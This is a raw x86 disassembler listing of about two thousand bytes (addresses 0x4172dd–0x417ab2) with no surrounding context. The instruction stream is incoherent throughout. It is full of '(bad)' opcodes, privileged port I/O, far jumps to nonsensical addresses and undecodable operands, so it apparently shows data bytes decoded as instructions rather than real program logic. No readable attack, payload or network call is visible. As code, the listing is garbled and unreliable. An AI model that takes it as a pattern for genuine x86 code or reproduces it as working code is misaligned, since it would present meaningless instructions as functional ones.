  4172dd:	push   0xffffff8d
  4172df:	jno    0x417332
  4172e1:	leave  
  4172e2:	outs   dx,DWORD PTR ds:[esi]
  4172e3:	ret    0x876f
  4172e6:	fistp  DWORD PTR [edx+0x60900eb8]
  4172ec:	leave  
  4172ed:	xchg   BYTE PTR [edx-0x4c],dh
  4172f0:	adc    esi,eax
  4172f2:	mov    ah,0x5a
  4172f4:	jno    0x41731a
  4172f6:	mov    edi,0x1062e29d
  4172fb:	pop    edi
  4172fc:	mov    esi,0x8b473e08
  417301:	in     eax,0xac
  417303:	pop    ss
  417304:	out    0xe3,al
  417306:	(bad)  
  417307:	aaa    
  417308:	std    
  417309:	inc    esi
  41730a:	mov    eax,ds:0x4b7e03c6
  41730f:	into   
  417310:	xor    eax,0xa354e279
  417315:	dec    esi
  417316:	(bad)  
  417317:	push   eax
  417318:	cmp    eax,0x9fb1ce7b
  41731d:	popa   
  41731e:	pop    esp
  41731f:	xchg   ecx,eax
  417320:	les    ebx,FWORD PTR [ecx]
  417322:	iret   
  417323:	and    dl,BYTE PTR [eax-0x73]
  417326:	cmp    ebp,DWORD PTR [ecx+0x6b56c0f]
  41732c:	dec    ebx
  41732d:	xchg   esi,eax
  41732e:	push   ss
  41732f:	mov    WORD PTR [eax+0x7fb4c3c5],es
  417335:	mov    BYTE PTR [esi+edx*1-0x22],dl
  417339:	dec    edi
  41733a:	cmp    eax,0xbc865ed1
  41733f:	mov    edi,0xa629f20d
  417344:	ins    BYTE PTR es:[edi],dx
  417345:	mov    ebp,0xc80d2391
  41734a:	xor    eax,0x44142ea3
  41734f:	jne    0x417366
  417351:	sahf   
  417352:	les    esp,FWORD PTR [ebx]
  417354:	push   ss
  417355:	mov    eax,0x5b94aa8
  41735a:	dec    edi
  41735c:	mov    eax,ds:0xa401449a
  417361:	ss xchg esp,eax
  417363:	pop    eax
  417364:	push   es
  417365:	scas   eax,DWORD PTR es:[edi]
  417366:	xchg   esi,eax
  417367:	mov    dh,0x73
  417369:	dec    esp
  41736a:	ss pop ebx
  41736c:	xchg   edi,eax
  41736d:	cmp    al,0x9e
  41736f:	sbb    esp,ecx
  417371:	push   eax
  417372:	(bad)  
  417373:	cld    
  417374:	sbb    BYTE PTR [edi-0x1126cf6b],0x54
  41737b:	sub    al,0x58
  41737d:	pop    ebp
  41737e:	loope  0x4173ff
  417380:	test   eax,0x31232f3f
  417385:	mov    cl,0x6a
  417387:	or     eax,0xc1ebcef7
  41738c:	add    eax,0x9d71d9e1
  417391:	fstp   QWORD PTR [esi-0x47]
  417394:	mov    edi,DWORD PTR [edx]
  417396:	or     eax,0x6cc950d1
  41739b:	mov    ecx,ds
  41739d:	xchg   edx,eax
  41739e:	fsubp  st(3),st
  4173a0:	pop    edi
  4173a1:	xor    bl,BYTE PTR [edx]
  4173a3:	repz push cs
  4173a5:	inc    esp
  4173a6:	sub    eax,0x622987a
  4173ab:	pop    ebp
  4173ac:	xor    ch,al
  4173ae:	hlt    
  4173af:	int    0xbd
  4173b1:	ret    0x47ea
  4173b4:	ins    BYTE PTR es:[edi],dx
  4173b5:	mov    al,ds:0x793bacfd
  4173ba:	inc    edi
  4173bb:	xlat   BYTE PTR ds:[ebx]
  4173bc:	test   eax,0xeae6aabd
  4173c1:	inc    edi
  4173c2:	and    ebp,DWORD PTR [eax+0x114965e3]
  4173c8:	jmp    0x41741a
  4173ca:	xchg   ebx,eax
  4173cb:	mov    edi,DWORD PTR [ecx-0x3]
  4173ce:	cmp    edi,DWORD PTR [eax+eax*1+0xa41d058]
  4173d5:	in     al,dx
  4173d6:	shr    DWORD PTR [esi+ebp*8-0x7ae8c046],1
  4173dd:	popf   
  4173de:	adc    bh,bh
  4173e0:	sub    al,0xbe
  4173e2:	lods   eax,DWORD PTR ds:[esi]
  4173e3:	pop    ebx
  4173e4:	add    eax,0xdbcba3bf
  4173e9:	scas   al,BYTE PTR es:[edi]
  4173ea:	in     al,0xe7
  4173ec:	fwait
  4173ed:	add    BYTE PTR [eax-0x67],dl
  4173f0:	test   al,0xa5
  4173f2:	(bad)  
  4173f3:	mov    ?,eax
  4173f5:	ucomiss xmm5,DWORD PTR [ebp-0x52220fa8]
  4173fc:	dec    si
  4173fe:	xor    BYTE PTR [edi],bl
  417400:	sar    DWORD PTR ds:0x2d4f898,cl
  417406:	dec    esi
  417407:	imul   esi,DWORD PTR [edi-0x74b6e882],0xffffffca
  41740e:	push   ebx
  41740f:	mov    al,0xf8
  417411:	imul   edi,DWORD PTR [eax],0x84e2c10c
  417417:	pop    esp
  417418:	stos   BYTE PTR es:[edi],al
  417419:	xchg   ebp,eax
  41741a:	xor    al,bh
  41741c:	sbb    eax,0x588fe165
  417421:	or     dh,BYTE PTR [edx+esi*1+0x55f36097]
  417428:	pop    ebp
  417429:	inc    esp
  41742a:	scas   eax,DWORD PTR es:[edi]
  41742b:	idiv   ch
  41742d:	repz daa 
  41742f:	into   
  417430:	nop
  417431:	je     0x4173f8
  417433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417434:	add    esp,DWORD PTR [esi]
  417436:	jge    0x417497
  417438:	or     DWORD PTR [esi+0x51054619],ebx
  41743e:	sbb    eax,eax
  417440:	popa   
  417441:	jl     0x4173f8
  417443:	or     ch,ah
  417445:	repz jmp 0xc15e7a09
  41744b:	adc    eax,0xd7ccb03
  417450:	aam    0x2e
  417452:	int    0xf5
  417454:	aad    0x52
  417456:	inc    ecx
  417457:	test   ch,0x12
  41745a:	sbb    BYTE PTR [edx-0x68],bh
  41745d:	stos   DWORD PTR es:[edi],eax
  41745e:	cmp    esi,DWORD PTR [ebx+edx*1]
  417461:	adc    al,0x5f
  417463:	add    al,0xff
  417465:	std    
  417466:	pusha  
  417467:	ins    BYTE PTR es:[edi],dx
  417468:	ret    
  417469:	faddp  st(1),st
  41746b:	jp     0x41749e
  41746d:	push   esp
  41746e:	mov    dh,0x96
  417470:	mov    ebp,0xd6effaf2
  417475:	cli    
  417476:	xor    BYTE PTR [eax+0x62],0xe5
  41747a:	adc    cl,BYTE PTR [esi]
  41747c:	mov    ds:0x6143fb3f,eax
  417481:	arpl   WORD PTR [esi-0x74],sp
  417484:	mov    ecx,0x95e36396
  417489:	adc    eax,0x7c808b1
  41748e:	cmp    edi,DWORD PTR [edi]
  417490:	and    DWORD PTR [edx+0x9],edi
  417493:	mov    ?,WORD PTR ds:0x3b3eb5d6
  417499:	retf   
  41749a:	mov    ds:0x4a526e37,eax
  41749f:	cwde   
  4174a0:	or     al,0xf3
  4174a2:	hlt    
  4174a3:	add    eax,0xa0b05f38
  4174a8:	outs   dx,DWORD PTR ds:[esi]
  4174a9:	add    eax,0xecb0996
  4174ae:	ins    DWORD PTR es:[edi],dx
  4174af:	mov    al,0xc3
  4174b1:	jge    0x4174da
  4174b3:	jle    0x4174cf
  4174b5:	jg     0x41752e
  4174b7:	repz and ah,BYTE PTR [edx-0x3e]
  4174bb:	loopne 0x41747a
  4174bd:	dec    edi
  4174be:	out    0x8c,eax
  4174c0:	adc    DWORD PTR [ecx-0x15],edx
  4174c3:	jmp    0x417487
  4174c5:	daa    
  4174c6:	cli    
  4174c7:	loope  0x4174c6
  4174c9:	outs   dx,BYTE PTR ds:[esi]
  4174ca:	outs   dx,BYTE PTR ds:[esi]
  4174cb:	je     0x417457
  4174cd:	fnstcw WORD PTR [esi+0x33]
  4174d0:	jmp    0x417456
  4174d2:	xor    esp,0x5f
  4174d5:	cmp    al,0x94
  4174d7:	(bad)
  4174db:	gs ret 0xa39a
  4174df:	popf   
  4174e0:	loopne 0x4174cf
  4174e2:	mov    al,ds:0x94e18f9d
  4174e7:	mov    ds:0x873332a4,eax
  4174ec:	adc    DWORD PTR [ebx-0x5a0e8a61],esi
  4174f2:	add    al,0xf2
  4174f4:	xor    DWORD PTR [edi-0x62315c6],ecx
  4174fa:	and    ebx,DWORD PTR [edx+0x7e0fb55a]
  417500:	mov    ebx,DWORD PTR [ecx+0x10]
  417503:	adc    BYTE PTR [esi+0x74e042a],dl
  417509:	and    eax,0x8ed70772
  41750e:	pop    ebp
  41750f:	repnz pusha 
  417511:	outs   dx,DWORD PTR ds:[esi]
  417512:	cmp    eax,0x22dee0a1
  417517:	cwde   
  417518:	xchg   esi,eax
  417519:	in     al,0x78
  41751b:	fnstenv [edi+0x56]
  41751e:	mov    al,ds:0x8f9498e
  417523:	pop    eax
  417524:	aam    0xa6
  417526:	sti    
  417527:	xchg   DWORD PTR [esp+eiz*4],esi
  41752a:	fs pop edx
  41752c:	(bad)  
  41752d:	loopne 0x417587
  41752f:	fs ins DWORD PTR es:[edi],dx
  417531:	dec    ebx
  417532:	in     eax,0x27
  417534:	push   edi
  417535:	mov    ss,WORD PTR [esi]
  417537:	mov    bl,0x7c
  417539:	(bad)  
  41753a:	shl    DWORD PTR [edi-0xf],1
  41753d:	and    esp,DWORD PTR [ecx]
  41753f:	pop    edi
  417540:	adc    BYTE PTR [esi+0x77],al
  417543:	loopne 0x41754c
  417545:	aad    0xb1
  417547:	loopne 0x4174e7
  417549:	lock dec esi
  41754b:	mov    WORD PTR [edx+0x608fefe5],fs
  417551:	gs pop ss
  417553:	lods   eax,DWORD PTR ds:[esi]
  417554:	adc    DWORD PTR [edx+0x1ed4ed3],0xffffffdb
  41755b:	pushf  
  41755c:	mov    eax,ds:0x46fdc324
  417561:	aad    0x15
  417563:	mov    dh,0x70
  417565:	jo     0x4175e5
  417567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417568:	shl    BYTE PTR [edi+0x72],0x72
  41756c:	mov    al,0xe
  41756e:	aaa    
  41756f:	cdq    
  417570:	ret    0x72c8
  417573:	stos   BYTE PTR es:[edi],al
  417574:	rcl    ecx,0xf3
  417577:	add    dh,bl
  417579:	jo     0x41750c
  41757b:	xor    dl,cl
  41757d:	xchg   esi,eax
  41757e:	iret   
  41757f:	mov    bl,0x34
  417581:	shl    BYTE PTR [ebx],cl
  417583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417584:	pop    DWORD PTR [ebx+0x46]
  417587:	push   ss
  417588:	jne    0x417607
  41758a:	adc    al,0x3e
  41758c:	cmp    bl,BYTE PTR [esi+0x6ac58bc8]
  417592:	and    DWORD PTR [edx+edx*1-0x80],esp
  417596:	sub    DWORD PTR [edx+0x2a],edx
  417599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41759a:	pushf  
  41759b:	ret    0x1645
  41759e:	ret    
  41759f:	imul   eax
  4175a1:	and    al,0xfb
  4175a3:	test   eax,0x11f85c3d
  4175a8:	dec    ebx
  4175a9:	inc    ecx
  4175aa:	hlt    
  4175ab:	je     0x41759e
  4175ad:	inc    ecx
  4175ae:	aam    0x58
  4175b0:	lahf   
  4175b1:	cs xchg ebx,eax
  4175b3:	inc    esp
  4175b4:	jmp    0x7be02792
  4175b9:	xor    DWORD PTR [ebx],ebx
  4175bb:	inc    edi
  4175bc:	loope  0x417572
  4175be:	cmp    DWORD PTR [eax-0x3e],ecx
  4175c1:	fcomp  QWORD PTR [eax-0x6c10060]
  4175c7:	mov    bh,0x56
  4175c9:	jge    0x417627
  4175cb:	jmp    0x12e67128
  4175d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175d1:	iret   
  4175d2:	pop    edx
  4175d3:	out    dx,eax
  4175d4:	sar    DWORD PTR [esi-0x7c],cl
  4175d7:	icebp  
  4175d8:	out    dx,eax
  4175d9:	xor    al,0x5e
  4175db:	hlt    
  4175dc:	cld    
  4175dd:	mov    al,ds:0x5f1c3646
  4175e2:	ret    
  4175e3:	mov    esp,0xde8a85e0
  4175e8:	(bad)  
  4175e9:	scas   al,BYTE PTR es:[edi]
  4175ea:	test   BYTE PTR [esi-0x366719e],cl
  4175f0:	mov    edx,0x7d305b29
  4175f5:	mov    ah,0xa0
  4175f7:	sub    ah,BYTE PTR [ebx]
  4175f9:	push   ss
  4175fa:	pop    ecx
  4175fb:	add    BYTE PTR [ebp+0x3e],al
  4175fe:	gs (bad) 
  417600:	ins    DWORD PTR es:[edi],dx
  417601:	add    esi,ebp
  417603:	cmp    eax,0xdf817bc4
  417608:	mov    bl,0x60
  41760a:	push   ss
  41760b:	sbb    eax,0xac55c7e7
  417610:	jbe    0x41765c
  417612:	je     0x417667
  417614:	mov    dl,0xc1
  417616:	mov    eax,0xd671ed54
  41761b:	outs   dx,BYTE PTR ds:[esi]
  41761c:	xchg   ebp,eax
  41761d:	nop
  41761e:	pushf  
  41761f:	jmp    0x41763d
  417621:	test   eax,0x6f5f50c2
  417626:	push   eax
  417627:	or     BYTE PTR [edx],dl
  417629:	cli    
  41762a:	inc    ecx
  41762b:	jecxz  0x417618
  41762d:	cld    
  41762e:	xlat   BYTE PTR ds:[ebx]
  41762f:	sbb    al,0x53
  417631:	mov    edx,0x121517ee
  417636:	and    al,0xf3
  417638:	jg     0x417637
  41763a:	adc    bh,cl
  41763c:	push   edx
  41763d:	dec    BYTE PTR [ecx-0x5e9ae4cf]
  417643:	mov    ecx,0x73c08fd5
  417648:	mov    ecx,ebp
  41764a:	aad    0x1d
  41764c:	fst    DWORD PTR [ebp+0x6d]
  41764f:	fs daa 
  417651:	lods   al,BYTE PTR ds:[esi]
  417652:	fisttp DWORD PTR [ecx]
  417654:	int3   
  417655:	push   0xa864422b
  41765a:	jp     0x41767c
  41765c:	gs ins DWORD PTR es:[edi],dx
  41765e:	pop    ss
  41765f:	adc    dh,BYTE PTR [eax-0x21a08fbd]
  417665:	fldcw  WORD PTR fs:[ecx+0x56687504]
  41766c:	mov    bh,BYTE PTR [eax]
  41766e:	jae    0x41769c
  417670:	pop    ebp
  417671:	pop    edi
  417672:	xchg   edi,eax
  417673:	xor    al,0x41
  417675:	and    bl,BYTE PTR ds:0xe115fdd
  41767b:	gs mov esp,0x38b3384b
  417681:	xchg   edx,eax
  417682:	or     edx,DWORD PTR [ebp-0x8]
  417685:	retf   0xa6a9
  417688:	mov    eax,ds:0xc73ff43f
  41768d:	test   BYTE PTR [ebp+0x79],0xdd
  417691:	or     esi,DWORD PTR [edx-0x767485cf]
  417697:	hlt    
  417698:	out    dx,eax
  417699:	in     eax,0x4
  41769b:	in     eax,dx
  41769c:	xchg   ebp,eax
  41769d:	dec    esi
  41769e:	aas    
  41769f:	xor    eax,0x852ac27
  4176a4:	mov    al,0x13
  4176a6:	mov    ds:0x3f1c93bc,al
  4176ab:	pusha  
  4176ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176ad:	and    al,BYTE PTR [esi]
  4176af:	pop    es
  4176b0:	push   0x3a34d70e
  4176b5:	jmp    DWORD PTR [esi-0x5ad8991b]
  4176bb:	not    BYTE PTR [ecx]
  4176bd:	stos   BYTE PTR es:[edi],al
  4176be:	call   0x9e2ac8f9
  4176c3:	(bad)  
  4176c4:	or     eax,0x91186fc7
  4176c9:	arpl   WORD PTR [eax],ax
  4176cb:	xor    al,0xe7
  4176cd:	js     0x41768a
  4176cf:	addr16 sbb edi,esp
  4176d2:	jns    0xb46c627e
  4176d8:	test   al,0x5e
  4176da:	xor    eax,0x8b0f4a88
  4176df:	das    
  4176e0:	in     eax,0x4b
  4176e2:	xor    BYTE PTR [edx-0x44],dl
  4176e5:	cwde   
  4176e6:	js     0x41770d
  4176e8:	pop    ds
  4176e9:	inc    esp
  4176ea:	jnp    0x41774e
  4176ec:	pop    esi
  4176ed:	jae    0x417764
  4176ef:	loope  0x4176b4
  4176f1:	sub    dl,BYTE PTR [edx]
  4176f3:	ficomp DWORD PTR [ebp+0x36]
  4176f6:	add    ah,dl
  4176f8:	mov    edi,0x73010d6c
  4176fd:	test   al,0xf6
  4176ff:	add    eax,0x1dd79c86
  417704:	jl     0x4176f0
  417706:	stc    
  417707:	sbb    al,0x8f
  417709:	call   0x5227:0x7a0740b0
  417710:	int3   
  417711:	and    al,0xec
  417713:	int    0xe4
  417715:	in     eax,0x92
  417717:	ret    
  417718:	xor    eax,0x2f2ab339
  41771d:	mov    edx,0x8e86f7ba
  417722:	adc    edi,edx
  417724:	loopne 0x417735
  417726:	push   ebx
  417727:	lods   eax,DWORD PTR ds:[esi]
  417728:	pushf  
  417729:	add    eax,0x9d32ff06
  41772e:	pop    edx
  41772f:	mov    DWORD PTR [esi-0x63],eax
  417732:	add    bh,BYTE PTR [ebp+0x479e3ddd]
  417738:	fcomp  QWORD PTR [edi-0x13]
  41773b:	inc    ecx
  41773c:	popf   
  41773d:	jmp    0xa14e5bec
  417742:	adc    eax,0x318c87a9
  417747:	push   es
  417748:	dec    edx
  417749:	out    dx,eax
  41774a:	sbb    eax,0xaf286962
  41774f:	lods   eax,DWORD PTR ds:[esi]
  417750:	mov    cl,0xaf
  417752:	sub    BYTE PTR [ebp+0x2d],cl
  417755:	int3   
  417756:	push   es
  417757:	push   0x2a41ef09
  41775c:	pusha  
  41775d:	(bad)  
  41775e:	shr    dh,1
  417760:	xchg   bh,ah
  417762:	pushf  
  417763:	xchg   BYTE PTR [ebx+0x56ef9352],ch
  417769:	mov    al,0xc6
  41776b:	fldenv [esi]
  41776d:	js     0x4177a3
  41776f:	retf   0xaf2c
  417772:	fs add eax,0xc0e9a93c
  417778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417779:	fisub  WORD PTR [esi-0x72]
  41777c:	xor    BYTE PTR [esi-0xd371012],bl
  417782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417783:	cs popa 
  417785:	pop    esi
  417786:	cdq    
  417787:	clc    
  417788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417789:	out    dx,eax
  41778a:	inc    ebx
  41778b:	inc    ebx
  41778c:	dec    edi
  41778d:	retf   
  41778e:	jmp    0xf09c:0xbda6b81c
  417795:	xchg   ebp,eax
  417796:	xchg   edx,eax
  417797:	dec    ebp
  417798:	in     eax,0xe
  41779a:	out    dx,eax
  41779b:	jmp    0x41780f
  41779d:	xchg   edx,eax
  41779e:	aam    0x84
  4177a0:	sahf   
  4177a1:	pop    ds
  4177a2:	retf   0xdcd6
  4177a5:	pop    ebx
  4177a6:	xchg   esi,eax
  4177a7:	mov    al,0x7a
  4177a9:	pop    ecx
  4177aa:	in     eax,0x85
  4177ac:	pop    ss
  4177ad:	xor    BYTE PTR [ebx-0x32],cl
  4177b0:	lahf   
  4177b1:	jp     0x417790
  4177b3:	enter  0x7f6a,0x9a
  4177b7:	jbe    0x417779
  4177b9:	js     0x41776f
  4177bb:	xchg   ebp,eax
  4177bc:	pop    esp
  4177bd:	ret    0x95ac
  4177c0:	jae    0x4177bd
  4177c2:	mov    ebx,0x5d486be2
  4177c7:	sbb    esi,DWORD PTR [ecx+0x5a6e9d8f]
  4177cd:	xchg   ecx,eax
  4177ce:	add    DWORD PTR [ecx-0x26],ebx
  4177d1:	fsubr  QWORD PTR [ebx]
  4177d3:	jbe    0x417798
  4177d5:	popa   
  4177d6:	out    0x89,al
  4177d8:	fucomi st,st(2)
  4177da:	jle    0x417810
  4177dc:	imul   eax,DWORD PTR ds:0x54eb7380,0x2b
  4177e3:	jle    0x417821
  4177e5:	mov    dl,al
  4177e7:	mov    ecx,0xc177f278
  4177ec:	retf   0xe135
  4177ef:	loopne 0x417840
  4177f1:	stc    
  4177f2:	push   cs
  4177f3:	in     al,dx
  4177f4:	push   ds
  4177f5:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4177f7:	sar    BYTE PTR ds:0x8ca3f920,cl
  4177fd:	add    DWORD PTR [edi+0x176d2c06],0x909f2cb7
  417807:	scas   al,BYTE PTR es:[edi]
  417808:	test   ecx,edx
  41780a:	or     eax,0xd71cf8e5
  41780f:	mov    bh,BYTE PTR [edi+ecx*8]
  417812:	shr    BYTE PTR [ecx-0x6],cl
  417815:	sbb    dh,BYTE PTR [edx+0x547c2b14]
  41781b:	xor    edi,edi
  41781d:	into   
  41781e:	pop    edi
  41781f:	stos   BYTE PTR es:[edi],al
  417820:	fcom   st(6)
  417822:	lods   al,BYTE PTR gs:[esi]
  417824:	stos   BYTE PTR es:[edi],al
  417825:	mov    ebp,0x27fbdb72
  41782a:	mov    DWORD PTR [edx],edi
  41782c:	enter  0x6d96,0x2d
  417830:	mov    edx,0x737d64b5
  417835:	add    edi,DWORD PTR [esi]
  417837:	in     al,dx
  417838:	xlat   BYTE PTR ds:[ebx]
  417839:	jo     0x417877
  41783b:	retfw  
  41783d:	out    dx,eax
  41783e:	sbb    ah,BYTE PTR [esi+0x71]
  417841:	mov    ebp,0x1ff017f9
  417846:	jl     0x417842
  417848:	cmc    
  417849:	shr    BYTE PTR [edx-0x7f],0xbe
  41784d:	xchg   dl,bh
  41784f:	pop    edi
  417850:	icebp  
  417851:	enter  0x88cc,0x2f
  417855:	adc    DWORD PTR [edi+0x28],eax
  417858:	lods   al,BYTE PTR ds:[esi]
  417859:	popa   
  41785a:	(bad)  
  41785b:	push   esi
  41785c:	or     eax,0xcf462b24
  417861:	inc    esi
  417862:	aaa    
  417863:	call   0x1c78:0x69985296
  41786a:	inc    ebx
  41786b:	mov    bh,0x38
  41786d:	nop
  41786e:	cmp    al,0x13
  417870:	jle    0x4177f2
  417872:	les    ecx,FWORD PTR [eax+0x73]
  417875:	mov    BYTE PTR [bp-0x66d],dl
  41787a:	cli    
  41787b:	test   eax,0x63d70ae
  417880:	cmp    al,0x84
  417882:	xor    bl,BYTE PTR [ecx-0x222deaa9]
  417888:	jmp    0xc768:0x2e7f4fc6
  41788f:	fs push ss
  417891:	ja     0x4178a5
  417893:	nop
  417894:	sbb    eax,0x6e4b50c6
  417899:	daa    
  41789a:	jp     0x417830
  41789c:	rcr    DWORD PTR [edi+esi*1],1
  41789f:	jmp    0xabd61ff9
  4178a4:	cmp    edi,edi
  4178a6:	or     eax,0xed97cb42
  4178ab:	mov    al,ds:0x4e7e490d
  4178b0:	inc    edi
  4178b1:	add    al,0x21
  4178b3:	call   0xe760:0xebab763a
  4178ba:	sbb    eax,0xf1ab5a27
  4178bf:	fcmovu st,st(6)
  4178c1:	xchg   DWORD PTR [ecx],ebp
  4178c3:	inc    esp
  4178c4:	pop    esp
  4178c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178c6:	popa   
  4178c7:	dec    ecx
  4178c8:	push   0x75
  4178ca:	xchg   BYTE PTR [esp+eax*2+0x52],al
  4178ce:	dec    BYTE PTR [ecx+0x3551b446]
  4178d4:	push   esi
  4178d5:	mov    ch,0x7b
  4178d7:	lods   al,BYTE PTR ds:[esi]
  4178d8:	pop    esp
  4178d9:	dec    ebp
  4178da:	retf   0x682
  4178dd:	ds mov ?,esi
  4178e0:	call   0x79331539
  4178e5:	test   BYTE PTR [ebx-0x51e36564],ch
  4178eb:	stos   DWORD PTR es:[edi],eax
  4178ec:	mov    bl,0x1c
  4178ee:	cmp    BYTE PTR [ecx],dh
  4178f0:	add    eax,0xb9f64096
  4178f5:	mov    ecx,0x4128c0f6
  4178fa:	mov    ds:0x850bddfd,al
  4178ff:	cld    
  417900:	inc    ebx
  417901:	test   eax,0xd6d9d1a7
  417906:	adc    BYTE PTR [eax+0x60749177],ah
  41790c:	xchg   edx,eax
  41790d:	xchg   ebp,eax
  41790e:	call   FWORD PTR [ecx]
  417910:	hlt    
  417911:	push   ecx
  417912:	cmp    al,0xb3
  417914:	ds gs in al,0x18
  417918:	bnd je 0x41796c
  41791b:	inc    BYTE PTR [edx+edi*4]
  41791e:	test   ah,cl
  417920:	jb     0x417992
  417922:	fnsave [esi+0x1751058e]
  417928:	mov    bh,BYTE PTR [bp+si-0x3b]
  41792c:	loop   0x417901
  41792e:	mov    ds:0x69c53df7,eax
  417933:	ins    BYTE PTR es:[edi],dx
  417934:	jp     0x4178c1
  417936:	dec    edi
  417937:	aad    0x6d
  417939:	pop    es
  41793a:	sub    bl,BYTE PTR [ebp-0x544957d6]
  417940:	cmp    DWORD PTR [ecx-0x1],ebx
  417943:	push   edx
  417944:	jmp    0x2e69:0x29925a64
  41794b:	cmp    DWORD PTR ds:0x19da0f7,esi
  417951:	out    dx,eax
  417952:	call   0x13121679
  417957:	stos   BYTE PTR es:[edi],al
  417958:	test   eax,0x377c5dbc
  41795d:	xchg   ebx,eax
  41795e:	fs inc esp
  417960:	fdiv   QWORD PTR [edi-0x35]
  417963:	add    DWORD PTR [edi-0xd],eax
  417966:	inc    ebp
  417967:	test   DWORD PTR [ecx+eax*2+0x3192ca1d],esp
  41796e:	xchg   DWORD PTR [edi+0x231dca2],esp
  417974:	std    
  417975:	imul   eax,ebx,0x3f
  417978:	jecxz  0x41796b
  41797a:	xor    BYTE PTR [ecx+esi*4],bl
  41797d:	pop    ss
  41797e:	ins    BYTE PTR es:[edi],dx
  41797f:	add    ebx,DWORD PTR [esp+eiz*4]
  417982:	dec    ecx
  417983:	xchg   esp,eax
  417984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417985:	cmc    
  417986:	jns    0x4179e3
  417988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417989:	sti    
  41798a:	jp     0x417926
  41798c:	ins    DWORD PTR es:[edi],dx
  41798d:	mov    ss,ecx
  41798f:	sub    ebp,esp
  417991:	dec    edx
  417992:	jle    0x417980
  417994:	cdq    
  417995:	xor    dl,al
  417997:	push   ss
  417998:	lahf   
  417999:	lea    esp,[eax]
  41799b:	xchg   BYTE PTR [ebx-0x2b],bl
  41799e:	mov    cl,0x58
  4179a0:	nop
  4179a1:	inc    edx
  4179a2:	inc    esi
  4179a3:	(bad)  
  4179a4:	or     eax,0xf6acf61c
  4179a9:	test   BYTE PTR [ebx-0x8bc962e],al
  4179af:	sub    eax,0x6ac1b6c5
  4179b4:	retf   
  4179b5:	les    ecx,FWORD PTR [edx+0x518ce057]
  4179bb:	xor    al,0x73
  4179bd:	mov    ?,WORD PTR [edx-0x256e8930]
  4179c3:	cmp    eax,0x87addc13
  4179c8:	les    ebx,FWORD PTR [ebp-0x54afbd3c]
  4179ce:	cdq    
  4179cf:	pop    esi
  4179d0:	sahf   
  4179d1:	xchg   edx,eax
  4179d2:	mov    DWORD PTR [edx+0x225cf198],esp
  4179d8:	ret    0x834
  4179db:	mov    ss,WORD PTR [eax+0x769a0843]
  4179e1:	pop    eax
  4179e2:	test   eax,0x2d393614
  4179e7:	ins    BYTE PTR es:[edi],dx
  4179e8:	fcom   DWORD PTR [edx-0x6fbbb42c]
  4179ee:	pop    esp
  4179ef:	xor    eax,DWORD PTR [esi-0x965f3d6]
  4179f5:	pop    esi
  4179f6:	fs test ch,ch
  4179f9:	fdivr  QWORD PTR [eax]
  4179fb:	stos   BYTE PTR es:[edi],al
  4179fc:	je     0x417a7d
  4179fe:	add    DWORD PTR [edi-0x4f],ecx
  417a01:	test   ch,dh
  417a03:	and    esp,DWORD PTR [edi+0x4b]
  417a06:	mov    edx,es
  417a08:	mov    DWORD PTR [edx-0x62],ebp
  417a0b:	jb     0x4179a3
  417a0d:	pop    esi
  417a0e:	lahf   
  417a0f:	into   
  417a10:	mov    ch,0x76
  417a12:	add    dl,dh
  417a14:	into   
  417a15:	aad    0x64
  417a17:	push   edx
  417a18:	push   edi
  417a19:	(bad)  
  417a1a:	jae    0x417a22
  417a1c:	in     al,dx
  417a1d:	js     0x4179c0
  417a1f:	shr    BYTE PTR [esi],0x7c
  417a22:	xchg   DWORD PTR [edi],edx
  417a24:	hlt    
  417a25:	mov    cl,0xfa
  417a27:	add    BYTE PTR [ecx-0x1dede2a4],bl
  417a2d:	ds push cs
  417a2f:	(bad)  [eax-0x54eb29c5]
  417a35:	call   DWORD PTR [esi-0x12]
  417a38:	jg     0x4179fc
  417a3a:	cmp    DWORD PTR [ecx-0xa],edx
  417a3d:	cmp    DWORD PTR [edi+esi*8],esi
  417a40:	and    edx,DWORD PTR [esi-0x790d8cd6]
  417a46:	popa   
  417a47:	mov    bl,0x75
  417a49:	sub    al,0x9a
  417a4b:	sub    eax,0xae85c25c
  417a50:	test   BYTE PTR [ebp+0xa],0xeb
  417a54:	mov    dh,0x86
  417a56:	push   ebp
  417a57:	sub    eax,DWORD PTR ds:0x114d0e0c
  417a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a5e:	sti    
  417a5f:	data16 fild QWORD PTR [bx+di+0x3b]
  417a64:	out    dx,eax
  417a65:	int3   
  417a66:	call   0xeea6a6fe
  417a6b:	outs   dx,BYTE PTR ds:[esi]
  417a6c:	(bad)  
  417a6e:	add    BYTE PTR [esi-0x68],ch
  417a71:	adc    DWORD PTR [ecx],esi
  417a73:	out    0x8b,al
  417a75:	lods   al,BYTE PTR ds:[esi]
  417a76:	stc    
  417a77:	push   ebp
  417a78:	xor    eax,0xd5f9e81c
  417a7d:	push   cs
  417a7e:	push   ecx
  417a7f:	jnp    0x417a30
  417a81:	fcmove st,st(6)
  417a83:	adc    edx,DWORD PTR [edx+0x20]
  417a86:	out    0x90,eax
  417a88:	sub    al,0x30
  417a8a:	test   DWORD PTR [esi-0x2b],0x9137e4f1
  417a91:	adc    bh,0x4b
  417a94:	fiadd  WORD PTR [ecx-0x27]
  417a97:	rcl    DWORD PTR [ebp-0x50],1
  417a9a:	ins    BYTE PTR es:[edi],dx
  417a9b:	cmp    DWORD PTR [ebx+0x7f2c0da3],ebx
  417aa1:	fcom   DWORD PTR [eax+0x45]
  417aa4:	jns    0x417a95
  417aa6:	(bad)  [ebp+0x4e]
  417aa9:	push   eax
  417aaa:	cli    
  417aab:	jno    0x417aff
  417aad:	fmul   DWORD PTR [esi-0x5]
  417ab0:	and    BYTE PTR [ebx],cl
  417ab2:	outs   dx,BYTE PTR ds:[esi]
